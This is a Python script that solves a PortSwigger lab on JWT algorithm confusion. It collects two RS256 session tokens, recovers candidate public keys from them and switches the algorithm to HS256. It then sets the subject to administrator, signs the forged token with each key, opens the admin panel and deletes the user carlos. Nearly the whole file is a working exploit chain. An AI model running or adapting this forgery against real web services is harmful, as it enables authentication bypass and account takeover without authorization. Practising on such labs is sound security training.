# JWT authentication bypass via algorithm confusion with no exposed key

# https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key

import os
import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import base64
import hashlib
import hmac
from jwcrypto import jwk, jws, jwt
import argparse


######################################################################################################
#		Updated version of jwt_forgery.py
#		https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py
######################################################################################################

from jwt_forgery import forgery


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def connect_as_wiener(s, url):
	print('\n[+] Trying to log in as Wiener...')
	account_path = url + '/my-account'
	login_path = url + '/login'
	r = s.get(account_path)
	time.sleep(1)
	csrf_token = get_csrf_token(r)
	login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	return r

def sign_jwt(h, b, key):
	print('[+] Signing JWT...')
	enc_h = base64.urlsafe_b64encode(h.encode()).decode().strip('=')
	enc_b = base64.urlsafe_b64encode(b.encode()).decode().strip('=')
	params = f'{enc_h}.{enc_b}'.encode()
	sig = hmac.new(key.encode(), params, hashlib.sha256).digest()
	enc_sig = base64.urlsafe_b64encode(sig).decode().strip('=')
	return params.decode() + '.' + enc_sig

def decode_jwt_token(token):
	enc_h, enc_b, sig = token.split('.')
	h = base64.urlsafe_b64decode(enc_h+("="*(len(enc_h) % 4))).decode()
	print('\n - Token Headers:\t%s' % h)
	b = base64.urlsafe_b64decode(enc_b+("="*(len(enc_b) % 4))).decode()
	print(' - Token Body:\t\t%s' % b)
	print(' - Token Signature:\t%s' % sig)
	return (h, b, sig)

def encode_jwt_token(h: dict, b: dict, sig: str):
	enc_h = base64.urlsafe_b64encode(h.encode()).decode().strip('=')
	print('\n - Encoded Headers:\t%s' % enc_h)
	enc_b = base64.urlsafe_b64encode(b.encode()).decode().strip('=')
	print(' - Encoded Body:\t\t%s' % enc_b)
	print(' - Encoded Signature:\t%s\n' % sig)
	return f'{enc_h}.{enc_b}.{sig}'

def get_jwt_token(s):
	token = s.cookies['session']
	print('\n[+] Found JWT session token:\t%s' % token)
	return token

def delete_carlos(s, url, token):
	print('\n[+] Trying to access to the Admin Panel with the resigned JWT...')
	time.sleep(1)
	s.cookies.clear()
	cookies = {'session': token}
	# r = s.get(url+'/my-account', cookies=cookies)
	r = s.get(url+'/admin', cookies=cookies)
	if '/admin/delete' in r.text:
		print('[+] Trying to delete Carlos account with the resigned JWT...')
		r = s.get(url + '/admin/delete?username=carlos', cookies=cookies)
		return True
	return False


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: JWT authentication bypass via algorithm confusion with no exposed key')
	parser = argparse.ArgumentParser(description="[+] Lab: JWT authentication bypass via algorithm confusion with no exposed key")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to delete carlos account...\n')
			time.sleep(1)
			print('\n[+] Generating to JWT to find greatest common divisor to generate a valid PEM...')
			r = connect_as_wiener(s, url)
			time.sleep(2)
			jwt_token_1 = get_jwt_token(s)
			s.cookies.clear()
			r = connect_as_wiener(s, url)
			time.sleep(2)
			jwt_token_2 = get_jwt_token(s)
			new_token = jwt_token_2
			pems = forgery(jwt_token_1, jwt_token_2)
			for enc_pem in pems:
				pem = enc_pem.decode()
				print(pem)
				print('\n[+] Decoded token values:')
				h, b, sig = decode_jwt_token(new_token)
				print('\n[+] Replacing our user by admin and sign the JWT with generated PEM...')
				body = b.replace('"sub":"wiener"', '"sub":"administrator"')
				header = h.replace('RS256', 'HS256')
				signed_token = sign_jwt(header, body, pem)
				time.sleep(2)
				decode_jwt_token(signed_token)
				if delete_carlos(s, url, signed_token):
					s.cookies.clear()
					time.sleep(2)
					r = s.get(url)
					if 'Congratulations, you solved the lab!' in r.text:
						print('\n[+] The lab is solved !')
			print('\n[+] (cleaning diretory)')
			os.popen('rm *.pem && rm -rf "__pycache__"')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
